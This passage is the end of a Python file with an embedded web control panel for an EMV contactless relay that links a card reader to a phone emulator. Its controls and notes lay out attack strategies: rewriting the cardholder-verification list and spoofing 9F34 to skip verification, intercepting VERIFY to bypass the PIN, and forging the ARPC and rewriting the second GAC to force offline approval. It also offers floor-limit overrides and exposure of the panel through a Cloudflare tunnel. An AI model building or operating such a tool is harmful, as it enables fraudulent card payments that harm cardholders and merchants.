        <div class="hint">If the reader stops sending CARD_PRESENT heartbeats (lost tag), auto-clear after N seconds and notify emulator. Set 0 to disable.</div>
        <div class="row" style="margin-top:8px;">
          <input type="number" id="cp_timeout" value="30" min="0" max="600" style="width:70px"/> sec
        </div>
        <div class="row" style="margin-top:8px;">
          <button class="btn" onclick="setCardPresentTimeout()">Apply</button>
        </div>
        <div class="kpi" id="cp_kpi" style="margin-top:6px;">30s</div>
      </div>
      <div class="card col-4">
        <h3>Cloudflare Tunnel</h3>
        <div class="hint">Expose the web UI through a Cloudflare Tunnel. Paste a tunnel token and click Start. The tunnel proxies to localhost:8090.</div>
        <div class="row" style="margin-top:8px;">
          <input type="text" id="cf_token" placeholder="tunnel token..." style="width:100%;font-size:12px;"/>
        </div>
        <div class="row" style="margin-top:8px;">
          <button class="btn" onclick="cfTunnelStart()">Start Tunnel</button>
          <button class="btn red" onclick="cfTunnelStop()">Stop Tunnel</button>
        </div>
        <div class="kpi" id="cf_kpi" style="margin-top:6px;">not running</div>
      </div>
      <div class="card col-12">
        <h3>Server Output</h3>
        <div class="row">
          <button class="btn alt" onclick="toggleStick('log_server')">Toggle Auto-Scroll</button>
          <button class="btn alt" onclick="clearChannel('all')">Clear All</button>
        </div>
        <div class="log full" id="log_server"></div>
      </div>
    </div>
  </section>

  <section class="panel" id="panel_toggles">
    <div class="grid">
      <div class="card col-8">
        <h3>EMV Strategy Controls</h3>
        <div class="hint">High-level transaction strategies mapped to underlying mutations. Recommended execution order: 1 &rarr; 2 &rarr; 3. Toggle on/off and click Apply Strategies.</div>
        <div id="strategy_list"></div>
        <div class="row" style="margin-top:10px;">
          <button class="btn" onclick="applyStrategies()">Apply Strategies</button>
          <button class="btn alt" onclick="clearStrategies()">Clear All Strategies</button>
        </div>
      </div>
      <div class="card col-4">
        <h3>Strategy Notes</h3>
        <div class="kpi" style="font-size:12px;line-height:1.7;">
          <b>1. No CVM / Signature</b><br>
          CVM List rewrite at GPO + READ RECORD. Puts 0x01 (No CVM) first. 9F34 spoofed to 010000.<br><br>
          <b>2. Bypass PIN Prompt</b><br>
          VERIFY intercept returns 6988. Safety net — if step 1 works, terminal never sends VERIFY.<br><br>
          <b>3. Force Offline Approval</b><br>
          ARPC forge + 2nd GAC rewrite to TC (CID 0x40) + TVR clearing. Needs valid ARQC from steps 1-2.<br><br>
          <b>Flow:</b> PPSE &rarr; SELECT &rarr; GPO &rarr; READ REC &rarr; 1st GAC &rarr; 2nd GAC<br>
          Step 1 fires at GPO/READ REC. Step 2 between READ REC and 1st GAC. Step 3 at 2nd GAC.
        </div>
      </div>
      <div class="card col-6">
        <h3>Low-Level Mutation Toggles</h3>
        <div class="hint">Individual mutation flags. These mirror the strategy controls above — toggling a strategy will update these automatically.</div>
        <div id="toggle_list"></div>
        <div class="row" style="margin-top:10px;">
          <button class="btn" onclick="applyToggles()">Apply Toggles</button>
        </div>
      </div>
      <div class="card col-6">
        <h3>Mutation Counters</h3>
        <div class="stat-grid" id="counter_grid"></div>
        <div class="kpi" id="counter_extra" style="margin-top:8px;"></div>
      </div>
    </div>
  </section>

  <section class="panel" id="panel_config">
    <div class="card col-12" style="grid-column:1/-1;">
      <h3>Launch Configuration</h3>
      <div class="hint">All fields below control how the relay will start. Click Apply Config to save, then use Start Relay in the Relay Control tab. Presets apply a bundle of settings instantly.</div>
      <div class="row" style="margin-bottom:10px;">
        <button class="btn" onclick="applyPreset('safe_default')">Preset: Safe Default</button>
        <button class="btn" onclick="applyPreset('quick_run')">Preset: Quick Run</button>
        <button class="btn warn" onclick="applyPreset('forensics')">Preset: Forensics</button>
      </div>
      <div class="grid" id="config_grid"></div>
      <div class="row" style="margin-top:10px;">
        <button class="btn" onclick="applyConfig()">Apply Config</button>
        <button class="btn alt" onclick="refreshState()">Refresh</button>
      </div>
    </div>
  </section>

  <section class="panel" id="panel_cdcvm">
    <div class="grid">
      <div class="card col-6">
        <h3>CDCVM Status</h3>
        <div class="hint">Consumer Device CVM — biometric/device credential verification from the emulator. When active, all CVM mutation paths are guarded and the card's original 9F34=3F0000 is preserved.</div>
        <div class="kpi" id="cdcvm_kpi">no data</div>
      </div>
      <div class="card col-6">
        <h3>Guard Phase Machine</h3>
        <div class="hint">EMV transaction phase state machine. Prevents out-of-order execution.</div>
        <div class="phase-bar" id="phase_bar"></div>
        <div class="kpi" id="guard_kpi" style="margin-top:6px;"></div>
      </div>
      <div class="card col-6">
        <h3>Reset Controls</h3>
        <div class="hint">SOFT RESET clears guard/state/CDCVM but preserves epoch and peer bindings — no re-handshake needed. SESSION RESET does a full reset including epoch — forces re-handshake.</div>
        <div class="row">
          <button class="btn warn" onclick="relaySoftReset()">SOFT RESET (preserve epoch)</button>
          <button class="btn red" onclick="relaySessionReset()">SESSION RESET (full reset)</button>
        </div>
        <div class="kpi" id="reset_result" style="margin-top:6px;"></div>
      </div>
      <div class="card col-6">
        <h3>Log Controls</h3>
        <div class="hint">Adjust the console/file log verbosity in real time. The internal ring buffer always captures DEBUG for the web UI.</div>
        <div class="row">
          <label>Level:</label>
          <select id="log_level_select" onchange="setLogLevel(this.value)">
            <option value="DEBUG">DEBUG</option>
            <option value="INFO" selected>INFO</option>
            <option value="WARNING">WARNING</option>
            <option value="ERROR">ERROR</option>
          </select>
        </div>
        <div class="kpi" id="log_stats_kpi" style="margin-top:6px;">no data</div>
      </div>
      <div class="card col-6">
        <h3>Guard Logs</h3>
        <div class="row">
          <button class="btn alt" onclick="clearChannel('guard')">Clear Guard Log</button>
        </div>
        <div class="log" id="log_guard" style="min-height:200px;max-height:200px;"></div>
      </div>
    </div>
  </section>

  <section class="panel" id="panel_diag">
    <div class="grid">
      <div class="card col-4">
        <h3>UDP Diagnostics</h3>
        <div class="grid">
          <div class="col-6"><label>Relay Host</label><input id="dg_host" value="0.0.0.0"/></div>
          <div class="col-6"><label>Relay Port</label><input id="dg_port" value="5566"/></div>
          <div class="col-12"><label>DIAG_DUMP count</label><input id="dg_count" value="20"/></div>
        </div>
        <div class="row">
          <button class="btn alt" onclick="diagStatus()">STATUS</button>
          <button class="btn alt" onclick="diagDump()">DIAG_DUMP</button>
        </div>
        <div class="kpi" id="diag_kpi">no data</div>
      </div>
      <div class="card col-8">
        <h3>Diagnostic Output</h3>
        <div class="row">
          <button class="btn alt" onclick="clearChannel('diag')">Clear</button>
        </div>
        <div class="log" id="log_diag"></div>
      </div>
    </div>
  </section>

  <section class="panel" id="panel_logs">
    <div class="card col-12" style="grid-column:1/-1;">
      <h3>All Channels</h3>
      <div class="row">
        <button class="btn alt" onclick="clearChannel('all')">Clear All</button>
        <button class="btn alt" onclick="toggleStick('log_all')">Toggle Auto-Scroll</button>
      </div>
      <div class="log full" id="log_all"></div>
    </div>
  </section>

  <section class="panel" id="panel_files">
    <div class="grid">
      <div class="card col-4">
        <h3>Project Files</h3>
        <div class="file-list" id="file_list"></div>
      </div>
      <div class="card col-8">
        <h3>File Viewer</h3>
        <div class="status">Selected: <span id="file_selected" class="muted">none</span></div>
        <textarea id="file_text" readonly placeholder="Select a file from the list..."></textarea>
      </div>
    </div>
  </section>

  </div>

<script>
const LOG_IDS = ['log_server','log_diag','log_all','log_guard'];
const STICKY = Object.fromEntries(LOG_IDS.map(k => [k, true]));
const byId = (id) => document.getElementById(id);
let userEditingToggles = false;
let userEditingConfig = false;
let userEditingStrategies = false;

const PHASES = ['IDLE','PPSE_SELECTED','AID_SELECTED','GPO_RESPONDED','READ_RECORD_DONE','FIRST_GAC_SENT','ARQC_RECEIVED','SECOND_GAC_FORGED','EXTERNAL_AUTH_DONE','COMPLETE','ERROR'];

async function j(url, method='GET', body=null) {
  const opt = {method, headers:{'Content-Type':'application/json'}};
  if (body) opt.body = JSON.stringify(body);
  const r = await fetch(url, opt);
  return await r.json();
}

function preferredHost() {
  const h = (window.location && window.location.hostname) ? window.location.hostname : '';
  return h && h !== '0.0.0.0' ? h : '0.0.0.0';
}

document.querySelectorAll('.tab').forEach(btn => {
  btn.onclick = () => {
    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.panel').forEach(x => x.classList.remove('active'));
    btn.classList.add('active');
    byId('panel_' + btn.dataset.tab).classList.add('active');
    if (btn.dataset.tab === 'files') loadFiles();
  };
});

function nearBottom(el) { return (el.scrollHeight - el.scrollTop - el.clientHeight) < 20; }
function toggleStick(id) { STICKY[id] = !STICKY[id]; }

function classifyColor(line) {
  const t = (line || '').toUpperCase();
  if (t.includes('[ERROR]') || t.includes('ERR') || t.includes('FAIL') || t.includes('[DIAG]')) return 'lv-red';
  if (t.includes('[WARNING]') || t.includes('WARN')) return 'lv-warn';
  if (t.includes('CDCVM')) return 'lv-purple';
  if (t.includes('[GUARD]')) return 'lv-warn';
  if (t.includes('LISTENING') || t.includes('REGISTER') || t.includes('SESSION') || t.includes('START')) return 'lv-green';
  if (t.includes('STATUS') || t.includes('INFO') || t.includes('DEBUG')) return 'lv-blue';
  return 'lv-neutral';
}

function renderLog(id, lines, forceBottom=false) {
  const el = byId(id);
  if (!el) return;
  const shouldScroll = STICKY[id] && (forceBottom || nearBottom(el));
  const frag = document.createDocumentFragment();
  for (const raw of (Array.isArray(lines) ? lines : [lines])) {
    const div = document.createElement('div');
    div.className = 'log-row ' + classifyColor(raw);
    div.textContent = raw;
    frag.appendChild(div);
  }
  el.appendChild(frag);
  if (shouldScroll) el.scrollTop = el.scrollHeight;
}

function badge(on) { return '<span class="badge ' + (on ? 'on' : 'off') + '">' + (on ? 'ON' : 'OFF') + '</span>'; }

function dot(on, cls) { return '<span class="dot ' + (on ? 'on' : 'off') + (cls ? ' '+cls : '') + '"></span>'; }

function statBox(val, lbl) {
  return '<div class="stat-box"><div class="val">' + val + '</div><div class="lbl">' + lbl + '</div></div>';
}

function renderPhases(currentPhase) {
  const el = byId('phase_bar');
  if (!el) return;
  const currentIdx = PHASES.indexOf(currentPhase);
  let html = '';
  for (let i = 0; i < PHASES.length; i++) {
    let cls = 'phase-pill';
    if (i === currentIdx) cls += ' active';
    else if (currentIdx >= 0 && i < currentIdx && currentPhase !== 'ERROR') cls += ' done';
    if (currentPhase === 'ERROR' && i === PHASES.length - 1) cls = 'phase-pill error';
    html += '<span class="' + cls + '">' + PHASES[i] + '</span>';
  }
  el.innerHTML = html;
}

async function refreshState() {
  try {
    const st = await j('/api/state');
    const r = st.relay || {};
    const cfg = st.config || {};
    byId('state_line').textContent = 'Relay: ' + (r.running ? 'RUNNING' : 'STOPPED') + ' | ' + (r.host||'0.0.0.0') + ':' + (r.port||5566);

    byId('relay_kpi').innerHTML =
      'Status: <b>' + (r.running ? 'RUNNING' : 'STOPPED') + '</b><br>' +
      'Bind: ' + (r.host||'0.0.0.0') + ':' + (r.port||5566) + '<br>' +
      'Guard phase: <b>' + (r.guard_phase||'-') + '</b><br>' +
      'Brand: ' + (r.brand||'-') + '<br>' +
      'Card present: ' + (r.card_present ? 'YES' : 'NO') + '<br>' +
      'Epoch: ' + (r.active_epoch||0) + '<br>' +
      'Full output: ' + (r.full_output ? 'ON' : 'OFF') + '<br>' +
      'Outcome guard: ' + (r.outcome_guard ? 'ON' : 'OFF') + '<br>' +
      'GPO force success: ' + (r.gpo_force_success ? 'ON' : 'OFF') + '<br>' +
      'Policy amount: ' + (r.policy_amount_cents||0) + ' cents<br>' +
      'Floor limit: ' + (r.floor_limit_cents||0) + ' cents' +
      (r.floor_limit_override > 0 ? ' <span class="badge on" style="font-size:10px;">OVERRIDE: ' + r.floor_limit_override + '</span>' : '') + '<br>' +
      'CVM priority: <b>' + (r.cdcvm_verified ? 'CDCVM (3F0000)' : 'No CVM (010000) > Signature > Fail') + '</b><br>' +
      'Risk level: <b>' + (cfg.risk_level||'-') + '</b>';

    byId('peer_kpi').innerHTML =
      'Reader: ' + (r.reader_addr ? r.reader_addr.join(':') : 'offline') + '<br>' +
      '  ID: ' + (r.reader_id||'-') + '<br><br>' +
      'Emulator: ' + (r.emulator_addr ? r.emulator_addr.join(':') : 'offline') + '<br>' +
      '  ID: ' + (r.emulator_id||'-');

    byId('wd_kpi').innerHTML = r.watchdog_enabled
      ? '<span class="badge on">ENABLED</span> — checking every ' + (r.watchdog_interval||10) + 's'
      : '<span class="badge off">DISABLED</span>';
    if (r.watchdog_interval) byId('wd_interval').value = r.watchdog_interval;

    const cpT = r.card_present_timeout || 0;
    byId('cp_kpi').innerHTML = cpT > 0
      ? '<span class="badge on">' + cpT + 's</span> — auto-clear if reader stops heartbeat'
      : '<span class="badge off">DISABLED</span>';
    if (cpT > 0) byId('cp_timeout').value = cpT;

    try {
      const cfStat = await j('/api/tunnel/status','GET');
      byId('cf_kpi').innerHTML = cfStat.running
        ? '<span class="badge on">RUNNING</span> — check server log for URL'
        : '<span class="badge off">NOT RUNNING</span>';
    } catch(e) { /* ignore */ }

    if (!userEditingToggles) {
      const toggles = [
        ['verify_bypass', r.verify_bypass],
        ['arpc_forge', r.arpc_forge],
        ['arpc_rewrite', r.arpc_rewrite],
        ['tvr_mutate', r.tvr_mutate],
      ];
      byId('toggle_list').innerHTML = toggles.map(([name, on]) =>
        '<div class="toggle-row"><span class="name">' + name + '</span>' +
        badge(on) +
        '<input type="checkbox" id="tog_' + name + '" ' + (on ? 'checked' : '') + ' onchange="userEditingToggles=true"></div>'
      ).join('');
    }

    const strategies = [
      ['nocvm_signature', 'No CVM / Signature', 1, r.verify_bypass !== undefined && (cfg.policy_mode === 'OFFLINE_NOCVM')],
      ['bypass_pin', 'Bypass PIN Prompt', 2, r.verify_bypass],
      ['force_offline', 'Force Offline Approval', 3, r.arpc_forge && r.arpc_rewrite && r.tvr_mutate],
    ];
    byId('strategy_list').innerHTML = strategies.map(([id, label, order, on]) =>
      '<div class="toggle-row"><span class="name"><b>' + order + '.</b> ' + label + '</span>' +
      badge(on) +
      '<input type="checkbox" id="strat_' + id + '" ' + (on ? 'checked' : '') + ' onchange="userEditingStrategies=true"></div>'
    ).join('');

    byId('counter_grid').innerHTML =
      statBox(r.verify_bypass_count||0, 'VERIFY Bypass') +
      statBox(r.arpc_forge_count||0, 'ARPC Forge') +
      statBox(r.arpc_rewrite_count||0, 'ARPC Rewrite') +
      statBox(r.tvr_mutation_count||0, 'TVR Mutate') +
      statBox(r.gac_response_count||0, 'GAC Responses');

    byId('counter_extra').innerHTML =
      '2nd AE pending: ' + (r.second_ae_pending ? '<b>YES</b> (' + (r.second_ae_reason||'') + ')' : 'NO');

    byId('cdcvm_kpi').innerHTML =
      '<div class="indicator">' + dot(r.cdcvm_verified, 'cdcvm') + ' CDCVM Verified: <b>' + (r.cdcvm_verified ? 'YES' : 'NO') + '</b></div><br>' +
      'Evidence method: ' + (r.cdcvm_evidence || 'none') + '<br>' +
      'AID: ' + (r.selected_aid || 'none') + '<br>' +
      (r.cdcvm_verified
        ? '<span class="badge cdcvm">All CVM mutations guarded - 9F34=3F0000 preserved</span>'
        : '<span class="badge off">CDCVM inactive - normal CVM mutation paths active</span>');

    renderPhases(r.guard_phase || 'IDLE');

    byId('guard_kpi').innerHTML =
      'Current: <b>' + (r.guard_phase||'-') + '</b><br>' +
      'Brand: ' + (r.brand||'-') + '<br>' +
      'Card: ' + (r.card_present ? 'PRESENT' : 'ABSENT');

    if (!userEditingConfig) {
      const cfgFields = [
        ['host','text'], ['port','number'], ['policy_mode','select'], ['policy_amount_cents','number'],
        ['outcome_guard','bool'], ['guard_verbose','bool'], ['full_output','bool'],
        ['gpo_force_success','bool'], ['tp_enabled','bool'], ['tp_strict_online','bool'],
        ['capdu_sig_verify','bool'], ['capdu_sig_strip','bool'], ['capdu_sig_pubkey','text'],
        ['verify_bypass','bool'], ['arpc_forge','bool'], ['arpc_rewrite','bool'], ['tvr_mutate','bool'],
        ['synth_plugin_enabled','bool'], ['synth_amount','number'], ['synth_currency_code','number'], ['synth_country_code','number'],
        ['floor_limit_override_cents','number'],
      ];
      const policyOptions = ['OFFLINE_NOCVM','ONLINE','AUTO'];
      byId('config_grid').innerHTML = cfgFields.map(([key, type]) => {
        const val = cfg[key];
        if (type === 'bool') {
          return '<div class="col-3"><label>' + key + '</label><input type="checkbox" id="cfg_' + key + '" ' + (val ? 'checked' : '') + ' onchange="userEditingConfig=true"></div>';
        }
        if (type === 'select') {
          const opts = policyOptions.map(o => '<option value="' + o + '"' + (val === o ? ' selected' : '') + '>' + o + '</option>').join('');
          return '<div class="col-3"><label>' + key + '</label><select id="cfg_' + key + '" onchange="userEditingConfig=true">' + opts + '</select></div>';
        }
        return '<div class="col-3"><label>' + key + '</label><input id="cfg_' + key + '" value="' + (val !== undefined ? val : '') + '" onchange="userEditingConfig=true"></div>';
      }).join('') +
        '<div class="col-3"><label>risk_level (computed)</label><input id="cfg_risk_level" value="' + (cfg.risk_level||'') + '" readonly style="opacity:.7"></div>';
    }

  } catch(e) {
    byId('state_line').textContent = 'Error: ' + e.message;
  }

  try {
    const batch = await j('/api/logs/batch?n=350');
    const ch = batch.channels || {};
    renderLog('log_server', ch.server || []);
    renderLog('log_diag', ch.diag || []);
    renderLog('log_guard', ch.guard || []);
    const all = [].concat(ch.server||[], ch.guard||[], ch.flow||[], ch.diag||[], ch.util||[]);
    renderLog('log_all', all);
  } catch(e) {}
}

async function refreshLive() {
  try {
    const st = await j('/api/state');
    const r = st.relay || {};
    const cfg = st.config || {};
    byId('state_line').textContent = 'Relay: ' + (r.running ? 'RUNNING' : 'STOPPED') + ' | ' + (r.host||'0.0.0.0') + ':' + (r.port||5566);

    byId('relay_kpi').innerHTML =
      'Status: <b>' + (r.running ? 'RUNNING' : 'STOPPED') + '</b><br>' +
      'Bind: ' + (r.host||'0.0.0.0') + ':' + (r.port||5566) + '<br>' +
      'Guard phase: <b>' + (r.guard_phase||'-') + '</b><br>' +
      'Brand: ' + (r.brand||'-') + '<br>' +
      'Card present: ' + (r.card_present ? 'YES' : 'NO') + '<br>' +
      'Epoch: ' + (r.active_epoch||0) + '<br>' +
      'Full output: ' + (r.full_output ? 'ON' : 'OFF') + '<br>' +
      'Outcome guard: ' + (r.outcome_guard ? 'ON' : 'OFF') + '<br>' +
      'GPO force success: ' + (r.gpo_force_success ? 'ON' : 'OFF') + '<br>' +
      'Policy amount: ' + (r.policy_amount_cents||0) + ' cents<br>' +
      'Floor limit: ' + (r.floor_limit_cents||0) + ' cents' +
      (r.floor_limit_override > 0 ? ' <span class="badge on" style="font-size:10px;">OVERRIDE: ' + r.floor_limit_override + '</span>' : '') + '<br>' +
      'CVM priority: <b>' + (r.cdcvm_verified ? 'CDCVM (3F0000)' : 'No CVM (010000) > Signature > Fail') + '</b><br>' +
      'Risk level: <b>' + (cfg.risk_level||'-') + '</b>';

    byId('peer_kpi').innerHTML =
      'Reader: ' + (r.reader_addr ? r.reader_addr.join(':') : 'offline') + '<br>' +
      '  ID: ' + (r.reader_id||'-') + '<br><br>' +
      'Emulator: ' + (r.emulator_addr ? r.emulator_addr.join(':') : 'offline') + '<br>' +
      '  ID: ' + (r.emulator_id||'-');

    byId('counter_grid').innerHTML =
      statBox(r.verify_bypass_count||0, 'VERIFY Bypass') +
      statBox(r.arpc_forge_count||0, 'ARPC Forge') +
      statBox(r.arpc_rewrite_count||0, 'ARPC Rewrite') +
      statBox(r.tvr_mutation_count||0, 'TVR Mutate') +
      statBox(r.gac_response_count||0, 'GAC Responses');

    byId('counter_extra').innerHTML =
      '2nd AE pending: ' + (r.second_ae_pending ? '<b>YES</b> (' + (r.second_ae_reason||'') + ')' : 'NO');

    byId('cdcvm_kpi').innerHTML =
      '<div class="indicator">' + dot(r.cdcvm_verified, 'cdcvm') + ' CDCVM Verified: <b>' + (r.cdcvm_verified ? 'YES' : 'NO') + '</b></div><br>' +
      'Evidence method: ' + (r.cdcvm_evidence || 'none') + '<br>' +
      'AID: ' + (r.selected_aid || 'none') + '<br>' +
      (r.cdcvm_verified
        ? '<span class="badge cdcvm">All CVM mutations guarded - 9F34=3F0000 preserved</span>'
        : '<span class="badge off">CDCVM inactive - normal CVM mutation paths active</span>');

    renderPhases(r.guard_phase || 'IDLE');

    byId('guard_kpi').innerHTML =
      'Current: <b>' + (r.guard_phase||'-') + '</b><br>' +
      'Brand: ' + (r.brand||'-') + '<br>' +
      'Card: ' + (r.card_present ? 'PRESENT' : 'ABSENT');

  } catch(e) {}

  try {
    const batch = await j('/api/logs/batch?n=350');
    const ch = batch.channels || {};
    renderLog('log_server', ch.server || []);
    renderLog('log_diag', ch.diag || []);
    renderLog('log_guard', ch.guard || []);
    const all = [].concat(ch.server||[], ch.guard||[], ch.flow||[], ch.diag||[], ch.util||[]);
    renderLog('log_all', all);
  } catch(e) {}
}

async function relayStart() { await j('/api/relay/start','POST'); await refreshState(); }
async function relayStop() { await j('/api/relay/stop','POST'); await refreshState(); }

async function watchdogEnable(on) {
  const interval = parseInt(byId('wd_interval').value, 10) || 10;
  await j('/api/relay/watchdog','POST', {enabled: on, interval: interval});
  await refreshState();
}

async function setCardPresentTimeout() {
  const val = parseFloat(byId('cp_timeout').value) || 0;
  await j('/api/config/update','POST', {card_present_timeout: val});
  await refreshState();
}

async function cfTunnelStart() {
  const token = byId('cf_token').value.trim();
  if (!token) { alert('Paste a tunnel token first'); return; }
  byId('cf_kpi').textContent = 'starting...';
  const out = await j('/api/tunnel/start','POST', {token: token});
  byId('cf_kpi').innerHTML = out.ok
    ? '<span class="badge on">STARTING</span> — check server log for URL'
    : '<span class="badge off">FAILED</span> ' + (out.error||'');
  await refreshState();
}

async function cfTunnelStop() {
  await j('/api/tunnel/stop','POST');
  byId('cf_kpi').innerHTML = '<span class="badge off">STOPPED</span>';
  await refreshState();
}

async function relaySoftReset() {
  const out = await j('/api/relay/soft-reset','POST');
  byId('reset_result').textContent = out.ok ? 'SOFT_RESET: ' + JSON.stringify(out.result||out) : 'Failed: ' + out.error;
  await refreshState();
}

async function relaySessionReset() {
  const out = await j('/api/relay/session-reset','POST');
  byId('reset_result').textContent = out.ok ? 'SESSION_RESET: ' + JSON.stringify(out.result||out) : 'Failed: ' + out.error;
  await refreshState();
}

async function setLogLevel(level) {
  const out = await j('/api/log/level','POST', {level: level});
  const kpi = byId('log_stats_kpi');
  if (out.ok) kpi.textContent = 'Log level: ' + out.current + ' (was ' + out.previous + ')';
}

async function refreshLogStats() {
  try {
    const s = await j('/api/log/stats');
    const kpi = byId('log_stats_kpi');
    if (s.total !== undefined) {
      const parts = Object.entries(s.by_level || {}).map(([k,v]) => k+'='+v).join(', ');
      kpi.textContent = 'Buffer: ' + s.total + ' records | APDU: ' + s.apdu_history_size + ' | ' + (parts||'(empty)');
    }
  } catch(e) {}
}

async function applyToggles() {
  const toggles = {};
  ['verify_bypass','arpc_forge','arpc_rewrite','tvr_mutate'].forEach(name => {
    const el = byId('tog_' + name);
    if (el) toggles[name] = el.checked;
  });
  userEditingToggles = false;
  await j('/api/relay/toggles','POST', toggles);
  await refreshState();
}

async function applyStrategies() {
  const enabled = {};
  ['nocvm_signature','bypass_pin','force_offline'].forEach(name => {
    const el = byId('strat_' + name);
    if (el) enabled[name] = el.checked;
  });
  userEditingStrategies = false;
  userEditingToggles = false;
  await j('/api/strategy/apply','POST', {enabled});
  await refreshState();
}

async function clearStrategies() {
  userEditingStrategies = false;
  userEditingToggles = false;
  await j('/api/strategy/apply','POST', {enabled: {nocvm_signature: false, bypass_pin: false, force_offline: false}});
  await refreshState();
}

async function applyPreset(name) {
  const out = await j('/api/config/preset','POST', {name: name});
  if (out.ok) {
    byId('config_grid').dataset.presetFlash = name + ' (' + (out.risk_level||'?') + ')';
  }
  userEditingConfig = false;
  await refreshState();
}

async function applyConfig() {
  const updates = {};
  ['host','port','policy_mode','policy_amount_cents','capdu_sig_pubkey','synth_amount','synth_currency_code','synth_country_code','floor_limit_override_cents'].forEach(key => {
    const el = byId('cfg_' + key);
    if (el) {
      if (key === 'port' || key === 'policy_amount_cents' || key === 'synth_amount' || key === 'synth_currency_code' || key === 'synth_country_code' || key === 'floor_limit_override_cents') updates[key] = parseInt(el.value, 10);
      else updates[key] = el.value;
    }
  });
  ['outcome_guard','guard_verbose','full_output','gpo_force_success','tp_enabled','tp_strict_online',
   'capdu_sig_verify','capdu_sig_strip','verify_bypass','arpc_forge','arpc_rewrite','tvr_mutate','synth_plugin_enabled'].forEach(key => {
    const el = byId('cfg_' + key);
    if (el) updates[key] = el.checked;
  });
  await j('/api/config/update','POST', updates);
  userEditingConfig = false;
  await refreshState();
}

async function clearChannel(channel) {
  await j('/api/logs/clear','POST', {channel});
  await refreshState();
}

async function diagStatus() {
  const out = await j('/api/diag/status','POST', {host: dg_host.value, port: dg_port.value});
  byId('diag_kpi').textContent = out.ok ? 'RTT: ' + (out.rtt_ms||'-') + 'ms' : 'Failed: ' + out.error;
  renderLog('log_diag', [JSON.stringify(out, null, 2)], true);
}
async function diagDump() {
  const out = await j('/api/diag/dump','POST', {host: dg_host.value, port: dg_port.value, count: dg_count.value});
  renderLog('log_diag', [JSON.stringify(out, null, 2)], true);
}

async function loadFiles() {
  const out = await j('/api/project/files');
  if (!out.ok) return;
  const list = byId('file_list');
  list.innerHTML = '';
  out.items.forEach(item => {
    const div = document.createElement('div');
    div.className = 'file-item';
    div.textContent = (item.is_dir ? '[DIR] ' : '[FILE] ') + item.name;
    div.onclick = async () => {
      if (item.is_dir) return;
      const rf = await j('/api/project/file?name=' + encodeURIComponent(item.name));
      if (rf.ok) {
        byId('file_selected').textContent = item.name;
        byId('file_text').value = rf.text;
      }
    };
    list.appendChild(div);
  });
}

if (byId('dg_host') && !byId('dg_host').value) byId('dg_host').value = preferredHost();
refreshState();
setInterval(refreshLive, 1500);
setInterval(refreshLogStats, 3000);
</script>
</body>
</html>
"""


if __name__ == "__main__":
    run_web_server()
